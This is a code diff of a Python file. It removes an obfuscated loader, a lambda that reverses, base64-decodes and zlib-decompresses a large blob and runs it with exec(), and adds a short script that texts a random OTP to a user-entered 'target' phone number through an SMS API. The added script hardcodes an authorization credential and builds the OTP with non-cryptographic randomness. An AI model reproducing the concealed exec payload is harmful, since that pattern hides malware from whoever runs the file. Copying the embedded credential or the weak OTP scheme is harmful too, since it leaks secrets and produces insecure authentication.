@@ -1,2 +1,30 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import requests
+import json
+import random
+
+def generate_otp(length=6):
+    return ''.join(random.choices('0123456789', k=length))
+
+def send_sms(target_number, message):
+    api_url = "https://api.bulksms.com/v1/messages"
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": "Basic NTkwM0VFODUyRDRCNDk3Q0FFQjFERURERjYwRTlGRjItMDItRjpRMFBFZkdjS1RySEFVTEdPRmJTZHZRdE5DQXlkTw=="
+    }
+    data = {
+        "to": target_number,
+        "from": "Your Name",
+        "body": message
+    }
+    response = requests.post(api_url, headers=headers, data=json.dumps(data))
+    return response.json()
+
+def main():
+    target_number = input("Enter target phone number: ")
+    otp = generate_otp()
+    message = f"Your OTP is {otp}"
+    response = send_sms(target_number, message)
+    print(response)
+
+if __name__ == "__main__":
+    main()
